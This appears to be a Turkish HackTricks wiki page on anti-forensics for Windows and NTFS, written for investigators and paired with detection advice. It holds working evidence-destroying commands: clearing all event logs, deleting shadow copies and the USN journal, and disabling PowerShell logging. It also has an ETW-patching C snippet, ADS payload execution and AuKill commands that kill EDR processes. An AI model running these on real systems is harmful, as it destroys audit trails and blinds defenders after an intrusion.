# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## Zaman Damgaları

Bir saldırgan, **dosyaların zaman damgalarını değiştirmekle** ilgilenebilir.\
Zaman damgalarını MFT içinde `$STANDARD_INFORMATION` \_\_ ve \_\_ `$FILE_NAME` özniteliklerinde bulmak mümkündür.

Her iki öznitelik de 4 zaman damgasına sahiptir: **Değiştirme**, **erişim**, **oluşturma** ve **MFT kayıt değişikliği** (MACE veya MACB).

**Windows gezgini** ve diğer araçlar, **`$STANDARD_INFORMATION`** içindeki bilgileri gösterir.

### TimeStomp - Anti-forensic Aracı

Bu araç, **`$STANDARD_INFORMATION`** içindeki zaman damgası bilgilerini **değiştirir** **ama** **`$FILE_NAME`** içindeki bilgileri **değiştirmez**. Bu nedenle, **şüpheli** **etkinlikleri** **belirlemek** mümkündür.

### Usnjrnl

**USN Journal** (Güncelleme Sırası Numarası Günlüğü), NTFS (Windows NT dosya sistemi) özelliğidir ve hacim değişikliklerini takip eder. [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) aracı, bu değişikliklerin incelenmesini sağlar.

![](<../../images/image (801).png>)

Önceki resim, dosya üzerinde bazı **değişikliklerin yapıldığını** gözlemleyebileceğimiz **aracın** gösterdiği **çıktıdır**.

### $LogFile

**Bir dosya sistemine yapılan tüm meta veri değişiklikleri**, [ön yazma günlüğü](https://en.wikipedia.org/wiki/Write-ahead_logging) olarak bilinen bir süreçte kaydedilir. Kaydedilen meta veriler, NTFS dosya sisteminin kök dizininde bulunan `**$LogFile**` adlı bir dosyada tutulur. [LogFileParser](https://github.com/jschicht/LogFileParser) gibi araçlar, bu dosyayı ayrıştırmak ve değişiklikleri belirlemek için kullanılabilir.

![](<../../images/image (137).png>)

Yine, aracın çıktısında **bazı değişikliklerin yapıldığını** görmek mümkündür.

Aynı aracı kullanarak **zaman damgalarının ne zaman değiştirildiğini** belirlemek mümkündür:

![](<../../images/image (1089).png>)

- CTIME: Dosyanın oluşturulma zamanı
- ATIME: Dosyanın değiştirilme zamanı
- MTIME: Dosyanın MFT kayıt değişikliği
- RTIME: Dosyanın erişim zamanı

### `$STANDARD_INFORMATION` ve `$FILE_NAME` karşılaştırması

Şüpheli değiştirilmiş dosyaları belirlemenin bir diğer yolu, her iki öznitelikteki zamanı karşılaştırarak **uyumsuzluklar** aramaktır.

### Nanosecond

**NTFS** zaman damgalarının **kesinliği** **100 nanosecond**'dir. Bu nedenle, 2010-10-10 10:10:**00.000:0000 gibi zaman damgalarına sahip dosyaları bulmak **çok şüphelidir**.

### SetMace - Anti-forensic Aracı

Bu araç, hem `$STARNDAR_INFORMATION` hem de `$FILE_NAME` özniteliklerini değiştirebilir. Ancak, Windows Vista'dan itibaren, bu bilgileri değiştirmek için canlı bir işletim sistemine ihtiyaç vardır.

## Veri Gizleme

NFTS, bir küme ve minimum bilgi boyutu kullanır. Bu, bir dosya bir buçuk küme kapladığında, **kalan yarımın asla kullanılmayacağı** anlamına gelir. Bu nedenle, bu boş alanda **veri gizlemek mümkündür**.

Slacker gibi, bu "gizli" alanda veri gizlemeye olanak tanıyan araçlar vardır. Ancak, `$logfile` ve `$usnjrnl` analizi, bazı verilerin eklendiğini gösterebilir:

![](<../../images/image (1060).png>)

Daha sonra, FTK Imager gibi araçlar kullanarak boş alanı geri almak mümkündür. Bu tür araçların içeriği obfuscate veya hatta şifreli olarak kaydedebileceğini unutmayın.

## UsbKill

Bu, **USB** portlarında herhangi bir değişiklik algılandığında bilgisayarı **kapatan** bir araçtır.\
Bunu keşfetmenin bir yolu, çalışan süreçleri incelemek ve **her bir python betiğini gözden geçirmektir**.

## Canlı Linux Dağıtımları

Bu dağıtımlar, **RAM** belleği içinde **çalıştırılır**. Onları tespit etmenin tek yolu, **NTFS dosya sisteminin yazma izinleriyle monte edilmesidir**. Sadece okuma izinleriyle monte edilirse, ihlali tespit etmek mümkün olmayacaktır.

## Güvenli Silme

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Yapılandırması

Adli soruşturmayı çok daha zor hale getirmek için birçok Windows günlükleme yöntemini devre dışı bırakmak mümkündür.

### Zaman Damgalarını Devre Dışı Bırak - UserAssist

Bu, her çalıştırılan yürütülebilir dosyanın tarihlerini ve saatlerini koruyan bir kayıt anahtarıdır.

UserAssist'i devre dışı bırakmak iki adım gerektirir:

1. UserAssist'i devre dışı bırakmak istediğimizi belirtmek için `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` ve `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` adlı iki kayıt anahtarını sıfıra ayarlayın.
2. `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` gibi görünen kayıt alt ağaçlarınızı temizleyin.

### Zaman Damgalarını Devre Dışı Bırak - Prefetch

Bu, Windows sisteminin performansını artırmak amacıyla çalıştırılan uygulamalar hakkında bilgi kaydedecektir. Ancak, bu adli uygulamalar için de faydalı olabilir.

- `regedit` komutunu çalıştırın
- Dosya yolunu `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters` olarak seçin
- Hem `EnablePrefetcher` hem de `EnableSuperfetch` üzerinde sağ tıklayın
- Her birinin değerini 1 (veya 3) yerine 0 olarak değiştirmek için Değiştir'i seçin
- Yeniden başlatın

### Zaman Damgalarını Devre Dışı Bırak - Son Erişim Zamanı

Bir NTFS hacminden bir klasör açıldığında, sistem, listedeki her klasör için **bir zaman damgası alanını güncellemek için zamanı alır**, buna son erişim zamanı denir. Yoğun kullanılan bir NTFS hacminde, bu performansı etkileyebilir.

1. Kayıt Defteri Düzenleyicisini (Regedit.exe) açın.
2. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem` yoluna gidin.
3. `NtfsDisableLastAccessUpdate` anahtarını arayın. Eğer yoksa, bu DWORD'u ekleyin ve değerini 1 olarak ayarlayın, bu işlem devre dışı bırakılacaktır.
4. Kayıt Defteri Düzenleyicisini kapatın ve sunucuyu yeniden başlatın.

### USB Geçmişini Sil

Tüm **USB Aygıt Girişleri**, bir USB Aygıtını PC veya Dizüstü Bilgisayarınıza taktığınızda oluşturulan alt anahtarları içeren **USBSTOR** kayıt anahtarı altında Windows Kayıt Defteri'nde saklanır. Bu anahtarı burada bulabilirsiniz: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Bunu silerek** USB geçmişini sileceksiniz.\
Ayrıca, bunları sildiğinizden emin olmak için [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) aracını kullanabilirsiniz (ve silmek için).

USB'ler hakkında bilgi kaydeden bir diğer dosya, `C:\Windows\INF` içindeki `setupapi.dev.log` dosyasıdır. Bu dosya da silinmelidir.

### Gölge Kopyalarını Devre Dışı Bırak

**Gölge kopyalarını listeleyin**: `vssadmin list shadowstorage`\
**Silin**: `vssadmin delete shadow`

Ayrıca, [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) adresinde önerilen adımları izleyerek GUI üzerinden de silebilirsiniz.

Gölge kopyalarını devre dışı bırakmak için [buradaki adımları](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows) izleyin:

1. Windows başlat düğmesine tıkladıktan sonra metin arama kutusuna "services" yazarak Hizmetler programını açın.
2. Listeden "Hacim Gölge Kopyası"nı bulun, seçin ve sağ tıklayarak Özellikler'e erişin.
3. "Başlangıç türü" açılır menüsünden Devre Dışı seçeneğini seçin ve ardından değişikliği onaylamak için Uygula ve Tamam'a tıklayın.

Hangi dosyaların gölge kopyasında kopyalanacağını yapılandırmayı da kayıt defterinde `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` yolunda değiştirmek mümkündür.

### Silinmiş Dosyaları Üzerine Yaz

- **Windows aracı** kullanabilirsiniz: `cipher /w:C` Bu, şifreleme aracına C sürücüsündeki kullanılmayan disk alanından herhangi bir veriyi kaldırmasını belirtir.
- Ayrıca, [**Eraser**](https://eraser.heidi.ie) gibi araçlar da kullanabilirsiniz.

### Windows Olay Günlüklerini Sil

- Windows + R --> eventvwr.msc --> "Windows Günlükleri"ni genişletin --> Her bir kategoriye sağ tıklayın ve "Günlüğü Temizle"yi seçin
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Windows Olay Günlüklerini Devre Dışı Bırak

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Hizmetler bölümünde "Windows Olay Günlüğü" hizmetini devre dışı bırakın
- `WEvtUtil.exec clear-log` veya `WEvtUtil.exe cl`

### $UsnJrnl'yi Devre Dışı Bırak

- `fsutil usn deletejournal /d c:`

---

## Gelişmiş Günlükleme & İzleme Manipülasyonu (2023-2025)

### PowerShell ScriptBlock/Modül Günlüğü

Windows 10/11 ve Windows Server'ın son sürümleri, `Microsoft-Windows-PowerShell/Operational` altında **zengin PowerShell adli kalıntıları** tutar (olaylar 4104/4105/4106). Saldırganlar bunları anlık olarak devre dışı bırakabilir veya silebilir:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Savunucular, bu kayıt defteri anahtarlarındaki değişiklikleri ve yüksek hacimli PowerShell olaylarının kaldırılmasını izlemelidir.

### ETW (Event Tracing for Windows) Yamanması

Uç nokta güvenlik ürünleri ETW'ye büyük ölçüde bağımlıdır. 2024'te popüler bir kaçış yöntemi, her ETW çağrısının olayı yaymadan `STATUS_SUCCESS` döndürmesi için `ntdll!EtwEventWrite`/`EtwEventWriteFull`'ı bellekte yamalamaktır:
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (e.g. `EtwTiSwallow`) PowerShell veya C++'da aynı primitive'i uygular. 
Yamanın **işlem yerel** olması nedeniyle, diğer işlemler içinde çalışan EDR'ler bunu atlayabilir. 
Tespit: bellekteki `ntdll` ile diskteki `ntdll`'yi karşılaştırın veya kullanıcı modundan önce hook yapın.

### Alternatif Veri Akışları (ADS) Yeniden Canlanması

2023'teki kötü amaçlı yazılım kampanyalarında (örneğin **FIN12** yükleyicileri) geleneksel tarayıcılardan kaçınmak için ADS içinde ikinci aşama ikili dosyaların sahnelenmesi gözlemlenmiştir:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Akışları `dir /R`, `Get-Item -Stream *` veya Sysinternals `streams64.exe` ile listeleyin. Ana makine dosyasını FAT/exFAT'a veya SMB üzerinden kopyalamak, gizli akışı kaldırır ve bu, araştırmacılar tarafından yükü geri almak için kullanılabilir.

### BYOVD & “AuKill” (2023)

Kendi Zayıf Sürücünüzü Getirin, fidye yazılımı ihlallerinde **anti-forensics** için artık rutin olarak kullanılmaktadır. Açık kaynaklı araç **AuKill**, şifreleme ve günlük yok etmeden **önce** EDR ve adli sensörleri askıya almak veya sonlandırmak için imzalı ancak zayıf bir sürücü (`procexp152.sys`) yükler:
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Sürücü daha sonra kaldırılır ve minimal artefaktlar bırakır.  
Önlemler: Microsoft'un savunmasız sürücü kara listesini (HVCI/SAC) etkinleştirin ve kullanıcı yazılabilir yollarından kernel hizmeti oluşturulması hakkında uyarı verin.

---

## Referanslar

- Sophos X-Ops – “AuKill: EDR'yi Devre Dışı Bırakmak İçin Silahlandırılmış Savunmasız Sürücü” (Mart 2023)  
https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr  
- Red Canary – “Gizlilik İçin EtwEventWrite'ı Yamanlama: Tespit ve Avlanma” (Haziran 2024)  
https://redcanary.com/blog/etw-patching-detection  

{{#include ../../banners/hacktricks-training.md}}
